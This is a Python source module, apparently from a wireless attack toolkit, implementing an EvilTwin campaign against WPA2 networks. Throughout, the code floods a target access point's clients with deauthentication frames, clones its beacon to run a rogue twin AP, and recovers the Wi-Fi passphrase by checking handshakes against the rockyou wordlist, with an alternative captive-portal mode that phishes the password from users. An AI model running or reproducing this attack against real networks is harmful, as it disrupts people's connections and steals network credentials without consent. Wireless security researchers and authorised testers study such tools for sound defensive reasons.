"""Capture-first EvilTwin PSK recovery: a real WPA2 handshake on the target
first (Step 1), then a WPA2-only twin that deauths the same clients every 0.5 s
(Step 2) and recovers the passphrase online by MIC-checking every twin-side M2
against rockyou + vault seeds (Step 3), saved to the vault as ``EVILTWIN_PSK``."""
from __future__ import annotations

import asyncio
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Callable, Iterator, Optional

from airscope.campaigns.campaign import Campaign
from airscope.campaigns.eviltwin.fake_ap import FakeAP
from airscope.crack.external import find_wordlist, iter_candidates
from airscope.crack.handshake import CrackablePair, crackable_pairs, mic_matches
from airscope.crack.wpa_psk import eapol_mic, kck, pmk, ptk
from airscope.dot11 import build_deauth, str_to_mac
from airscope.dot11.ap import beacon_clone, eapol_m3, eapol_m3_payload
from airscope.models.handshake import Handshake, HandshakeMessage
from airscope.persist.common import parse_hc22000
from airscope.persist.config import Config
from airscope.persist.save import save_eviltwin_psk
from airscope.persist.vault import Vault

_POLL_SEC = 0.25
_REFERENCE_TIMEOUT_SEC = 120.0
_DEAUTH_PERIOD_SEC = 0.5
_ONLINE_LIMIT = 100_000
_YIELD_EVERY = 2_000
_PROGRESS_EVERY_SEC = 10.0

_PSK_AKMS = (0x02, 0x04, 0x06)


def csa_target_channel(ap_channel: int, preferred: Optional[int] = None) -> int:
    """``preferred`` when it is a valid decoy channel in the AP's own band, else the classic
    1<->6 or 36<->40 swap. Kept for API compatibility with the pre-0.3 CSA flow."""
    if preferred is not None and preferred != ap_channel:
        return preferred
    return 40 if ap_channel == 36 else (36 if ap_channel > 14 else (6 if ap_channel == 1 else 1))


def default_punt_modes(ap) -> tuple:
    """Kept for API compatibility with the pre-0.3 punter design; the reimplemented EvilTwin
    uses continuous rapid deauth instead (see ``_deauth_loop``)."""
    return ()


@dataclass(frozen=True)
class EvilTwinInput:
    """The modal's output: the deauth card (Step 1 + rapid deauth) and the fake-AP card. The twin
    mirrors the target's SSID/channel; only the BSSID stays tunable."""
    twin_iface: object
    punt_iface: object
    twin_channel: int
    twin_bssid: str
    punt_modes: tuple = ()
    csa_channel: Optional[int] = None
    punt_period_sec: Optional[float] = None
    punt_once: bool = False
    use_captive_portal: bool = False


class _CandidateFeed:
    """Exhaustion-aware wrapper over the candidate generator."""

    def __init__(self, gen: Iterator[str]):
        self._gen = gen
        self.done = False

    def __iter__(self) -> "_CandidateFeed":
        return self

    def __next__(self) -> str:
        try:
            return next(self._gen)
        except StopIteration:
            self.done = True
            raise


class EvilTwinCampaign(Campaign):
    button_id = "btn-eviltwin"
    key = "eviltwin"
    idle_label = "EvilTwin"
    run_label = "Stop EvilTwin"
    idle_variant = "primary"
    run_variant = "error"

    @classmethod
    def visible(cls, ap) -> bool:
        """WPA2 or WPA3-transition only: the target must offer a passphrase-derived AKM, so
        pure-WPA3/SAE targets (no PSK handshake to steal) hide the button entirely."""
        if not (ap.ssid and ap.akm_suites):
            return False
        return bool(set(_PSK_AKMS) & set(ap.akm_suites))

    @classmethod
    def ineligible_reason(cls, ap) -> Optional[str]:
        """Why a visible EvilTwin button is disabled (hidden SSID is handled by ``visible``)."""
        if not ap.last_beacon_frame:
            return "no beacon captured yet"
        return None

    def __init__(self, array, target, evil_input: EvilTwinInput, log=None,
                 existing_handshake_path=None):
        if not target.last_beacon_frame:
            raise ValueError("EvilTwin needs a captured beacon to clone; none seen yet.")
        if not target.ssid:
            raise ValueError("EvilTwin needs a known SSID: target is hidden.")
        super().__init__(ap=target, array=array)
        self._iface = evil_input.twin_iface
        self.log = log or (lambda _m: None)
        self.ssid = target.ssid
        self.twin_iface = evil_input.twin_iface
        self.punt_iface = evil_input.punt_iface
        self.twin_channel = target.channel
        self.twin_bssid = evil_input.twin_bssid.lower()
        self.same_bssid = self.twin_bssid == target.bssid.lower()
        self.use_captive_portal = evil_input.use_captive_portal
        self.existing_handshake_path = existing_handshake_path
        if self.use_captive_portal:
            from airscope.dot11.ap import beacon_open
            self.twin_beacon = beacon_open(
                target.last_beacon_frame, self.twin_channel,
                None if self.same_bssid else str_to_mac(self.twin_bssid))
        else:
            self.twin_beacon = beacon_clone(
                target.last_beacon_frame, self.twin_channel,
                None if self.same_bssid else str_to_mac(self.twin_bssid))
        self.fakeap: Optional[FakeAP] = None
        self.captured = False
        self.password: Optional[str] = None
        self.on_recovered: Optional[Callable[[str], None]] = None
        self._candidates: Optional[_CandidateFeed] = None
        self._deauth_task: Optional[asyncio.Task] = None
        self._checked_m2 = 0
        self._captive_portal = None

    # ----- helpers ------------------------------------------------------------

    def _target_clients(self) -> list:
        if not self.array.clients:
            return []
        bssid = self.ap.bssid.lower()
        return [c for c in self.array.clients.values() if c.bssid == bssid]

    def _crackable_instances(self, ap_bssid: str) -> list:
        ap = self.array.access_points.get(ap_bssid)
        if ap is None:
            return []
        return [(hs, pair)
                for hs in ap.handshakes.values()
                for pair in crackable_pairs(hs)]

    def _candidate_source(self) -> Optional[_CandidateFeed]:
        if self._candidates is not None:
            return self._candidates
        seeds = (psk for _bssid, psk in Vault().iter_psk_items())
        wordlist = find_wordlist()
        if wordlist is None and not seeds:
            self.log("[yellow]no dictionary found (install rockyou or save a PSK seed); "
                     "Step 3 cannot verify[/yellow]")
            return None
        if wordlist:
            self.log(f"dictionary: {wordlist}")
        self._candidates = _CandidateFeed(iter_candidates(wordlist, seeds))
        return self._candidates

    def _load_existing_handshake(self) -> bool:
        """Load handshake from existing_handshake_path into self.ap.handshakes.

        The tool saves handshakes in both .pcap and .hc22000 formats.
        We parse the .hc22000 file (same base name) to reconstruct Handshake
        objects with their EAPOL messages.
        """
        if not self.existing_handshake_path:
            return False

        path = Path(self.existing_handshake_path)
        if not path.exists():
            self.log(f"[bold red]handshake file not found: {path}[/bold red]")
            return False

        # Find the corresponding .hc22000 file
        hc22000_path = path.with_suffix(".hc22000")
        if not hc22000_path.exists():
            # Try the pcap directory's aggregate file
            hc22000_path = Path(Config.captures_dir) / f"{path.stem}.hc22000"
            if not hc22000_path.exists():
                self.log(f"[bold red]no .hc22000 file found for {path}[/bold red]")
                return False

        try:
            # Parse hc22000 file and reconstruct Handshake objects
            loaded = 0
            for line in hc22000_path.read_text().splitlines():
                entry = parse_hc22000(line)
                if not entry:
                    continue
                if entry.kind != "02":  # Only 4-way handshakes (WPA*02)
                    continue
                if entry.mac_ap != self.ap.bssid.lower():
                    continue

                # Get or create Handshake for this client
                hs = self.ap.handshakes.get(entry.mac_sta)
                if hs is None:
                    hs = Handshake(
                        bssid=entry.mac_ap,
                        client_mac=entry.mac_sta,
                        beacon_frame=self.ap.last_beacon_frame,
                        akm_offered=list(self.ap.akm_suites),
                    )
                    self.ap.handshakes[entry.mac_sta] = hs

                # Reconstruct HandshakeMessage from hc22000 fields
                # The eapol field contains the raw EAPOL frame bytes (hex)
                if entry.eapol:
                    eapol_bytes = bytes.fromhex(entry.eapol)
                    # Determine msg_num from message_pair
                    msg_pair = int(entry.message_pair) if entry.message_pair else 0
                    msg_num = 0
                    if msg_pair in (0x00, 0x02):  # M1+M2 or M2+M3, EAPOL from M2
                        msg_num = 2
                    elif msg_pair in (0x05, 0x01):  # M3+M4 or M1+M4, EAPOL from M4
                        msg_num = 4

                    hs_msg = HandshakeMessage(
                        raw=eapol_bytes,
                        msg_num=msg_num,
                        replay_hex=entry.anonce.lower() if entry.anonce else "",
                        nonce=bytes.fromhex(entry.anonce) if entry.anonce else b"",
                        mic=bytes.fromhex(entry.pmkid_or_mic) if entry.pmkid_or_mic else b"",
                        key_data_len=0,  # Not easily extracted from hc22000
                        eapol_payload=eapol_bytes,
                        akm=None,
                        timestamp=0.0,
                    )
                    if not hs.has_message(eapol_bytes):
                        hs.messages.append(hs_msg)
                        loaded += 1

            self.log(f"[et] loaded {loaded} EAPOL messages from {hc22000_path.name}")
            return loaded > 0

        except Exception as e:
            self.log(f"[bold red]failed to load existing handshake: {e}[/bold red]")
            return False

    def _verify_online(self, hs: Handshake, pair: CrackablePair) -> Optional[str]:
        feed = self._candidate_source()
        if feed is None:
            return None
        tried = 0
        for password in feed:
            if mic_matches(password, self.ssid, hs, pair=pair):
                return password
            tried += 1
            if tried >= _ONLINE_LIMIT:
                return None
            if tried % _YIELD_EVERY == 0:
                asyncio.sleep(0)
        return None

    async def _disconnect_client(self, client_mac: bytes) -> None:
        frame = build_deauth(str_to_mac(self.twin_bssid), client_mac, b"\xff\xff\xff\xff\xff\xff",
                             reason=4, disassoc=False)
        await self.twin_iface.send_no_wait(frame)

    def _recovered(self, password: str) -> None:
        ap = self.ap
        self.password = password
        self.captured = True
        result = save_eviltwin_psk(self.ap, password)
        summary = result.what_captured if result is not None else f"EvilTwin PSK for {ap.ssid}"
        self.log(f"[bold green]✓ Password found: {password!r}[/bold green] "
                 f"[dim]({summary})[/dim]")
        if self.on_recovered is not None:
            self.on_recovered(password)

    # ----- Step 1: a real handshake first --------------------------------------

    async def _capture_reference(self) -> bool:
        """Deauth until the always-on capture holds a crackable M1+M2 on the real AP."""
        self.log("[1/3] capturing a real handshake first (deauth clients + broadcast)")
        deadline = time.monotonic() + _REFERENCE_TIMEOUT_SEC
        deauths_sent = 0
        last_progress = time.monotonic()
        while not self.stopped:
            if time.monotonic() > deadline:
                self._log_step1_failure(deauths_sent)
                return False
            if self._crackable_instances(self.ap.bssid.lower()):
                return True
            await self._deauth_once()
            deauths_sent += 1
            now = time.monotonic()
            if now - last_progress >= _PROGRESS_EVERY_SEC:
                last_progress = now
                self._log_step1_progress(deauths_sent)
            await asyncio.sleep(_POLL_SEC)
        return False

    def _log_step1_progress(self, deauths_sent: int) -> None:
        ap = self.array.access_points.get(self.ap.bssid.lower())
        hs_count = len(ap.handshakes) if ap else 0
        total_eapol = sum(len(hs.messages) for hs in ap.handshakes.values()) if ap else 0
        self.log(f"[dim]  ... {deauths_sent} deauth bursts sent, "
                 f"{hs_count} handshake(s), {total_eapol} EAPOL frame(s) captured[/dim]")

    def _log_step1_failure(self, deauths_sent: int) -> None:
        ap = self.array.access_points.get(self.ap.bssid.lower())
        hs_count = len(ap.handshakes) if ap else 0
        total_eapol = sum(len(hs.messages) for hs in ap.handshakes.values()) if ap else 0
        clients = self._target_clients()
        parts = [f"{deauths_sent} deauth bursts"]
        if clients:
            parts.append(f"{len(clients)} client(s) targeted")
        else:
            parts.append("[red]no clients seen[/red]")
        if hs_count:
            parts.append(f"{hs_count} handshake(s), {total_eapol} EAPOL frames")
            parts.append("[dim](need M1+M2 crackable pair)[/dim]")
        else:
            parts.append("no handshakes captured")
        self.log(f"[bold red]✗ no real handshake captured before timeout "
                 f"({_REFERENCE_TIMEOUT_SEC:.0f}s)[/bold red]")
        self.log(f"[dim]  {', '.join(parts)}[/dim]")

    # ----- Step 2: twin beacon + rapid deauth, concurrently ---------------------

    async def _step2_run_twin(self) -> None:
        if self.same_bssid:
            self.array.ignore_stray_beacons(self.twin_bssid, self.twin_channel)
        else:
            self.array.mark_evil_twin(self.twin_bssid)
            self.array.note_own_beacon(self.twin_bssid, self.twin_channel, self.twin_beacon)
        self.fakeap = FakeAP(self.twin_iface, str_to_mac(self.twin_bssid), self.ssid,
                             self.twin_channel, self.twin_beacon, rx_source=self.twin_iface,
                             record_m1=self.array.record_injected_eapol,
                             open_mode=self.use_captive_portal)
        await self.fakeap.start()
        if self.use_captive_portal:
            self.log(f"[2/3] twin live on ch {self.twin_channel} (OPEN, {self.ssid!r}); "
                     "captive portal running")
        else:
            self.log(f"[2/3] twin live on ch {self.twin_channel} (WPA2-only RSN, {self.ssid!r}); "
                     "rapid deauth running")

    def _deauth_loop(self) -> asyncio.Task:
        async def _loop() -> None:
            while not self.stopped and self.password is None:
                await self._deauth_once()
                await asyncio.sleep(_DEAUTH_PERIOD_SEC)

        return asyncio.create_task(_loop())

    async def _deauth_once(self) -> None:
        for client in self._target_clients():
            await self.punt_iface.deauth_client(self.ap.bssid, client.mac, rounds=2)
        await self.punt_iface.deauth_broadcast(self.ap.bssid, count=8)

    # ----- Step 3: online MIC recovery over the twin's 4-way --------------------

    async def _step3_recover(self) -> None:
        """Every fresh twin-side M2 runs the shared online check; a miss disconnects the client
        (it re-associates so a new M1/M2 streams) while the wordlist cursor keeps advancing."""
        self.log("[3/3] watching the twin for an M2; online MIC check armed")
        seen: set[tuple[str, bytes]] = set()
        feed: Optional[_CandidateFeed] = None
        while not self.stopped and self.password is None:
            if feed is not None and feed.done:
                self.log("[yellow]dictionary exhausted without a match; Step 3 stopped. "
                         "Try a stronger wordlist.[/yellow]")
                return
            for hs, pair in self._crackable_instances(self.twin_bssid):
                key = (hs.client_mac, pair.mic_frame.nonce)
                if key in seen:
                    continue
                seen.add(key)
                self._checked_m2 += 1
                password = self._verify_online(hs, pair)
                if password is not None:
                    self._recovered(password)
                    await self._complete_m3(hs.client_mac, pair, password)
                    return
                feed = self._candidates
                await self._disconnect_client(str_to_mac(hs.client_mac))
            await asyncio.sleep(_POLL_SEC)

    async def _complete_m3(self, client_mac: str, pair: CrackablePair, password: str) -> None:
        payload = eapol_m3_payload(pair.anonce_frame.nonce)
        mic = eapol_mic(kck(ptk(str_to_mac(self.twin_bssid), str_to_mac(client_mac),
                                pair.anonce_frame.nonce, pair.mic_frame.nonce,
                                pmk(self.ssid, password))), payload)
        await self.twin_iface.send_no_wait(
            eapol_m3(str_to_mac(self.twin_bssid), str_to_mac(client_mac),
                     pair.anonce_frame.nonce, mic))

    # ----- Step 3: captive portal mode ----------------------------------------

    async def _step3_captive_portal(self) -> None:
        """Launch userland captive-portal AP stack and wait for a password."""
        from airscope.evil_twin.orchestration import CaptivePortalOrchestrator

        instances = self._crackable_instances(self.ap.bssid.lower())
        if not instances:
            self.log("[bold red]no handshake available for validation[/bold red]")
            return

        hs, pair = instances[0]

        def _on_password(password: str) -> None:
            self.password = password
            self._recovered(password)

        self._captive_portal = CaptivePortalOrchestrator(
            driver=self.twin_iface.driver,
            iface=self.twin_iface,
            ssid=self.ssid,
            bssid=self.twin_bssid,
            channel=self.twin_channel,
            hs=hs, pair=pair,
            log_fn=self.log,
            on_password=_on_password,
        )
        await self._captive_portal.start()

        self.log("[3/3] captive portal active; waiting for password submission")
        while not self.stopped and self.password is None:
            await asyncio.sleep(0.5)

        if self._captive_portal is not None:
            await self._captive_portal.stop()
            self._captive_portal = None

    # ----- lifecycle: _loop = the work; teardown = release the radio --------------

    async def _loop(self) -> None:
        if self.existing_handshake_path is not None:
            self.log(f"[et] using existing handshake: {self.existing_handshake_path}")
            if not self._load_existing_handshake():
                return
        else:
            if not await self._capture_reference():
                return
        if self.use_captive_portal:
            await self._step2_run_twin()
            await self._step3_captive_portal()
        else:
            self._deauth_task = self._deauth_loop()
            await self._step2_run_twin()
            await self._step3_recover()

    async def teardown(self) -> None:
        if self._deauth_task is not None:
            self._deauth_task.cancel()
        if self._captive_portal is not None:
            self._captive_portal.stop()
            self._captive_portal = None
        if self.fakeap is not None:
            await self.fakeap.stop()
        self.array.stop_ignoring_stray_beacons(self.twin_bssid)
        self.array.unmark_evil_twin(self.twin_bssid)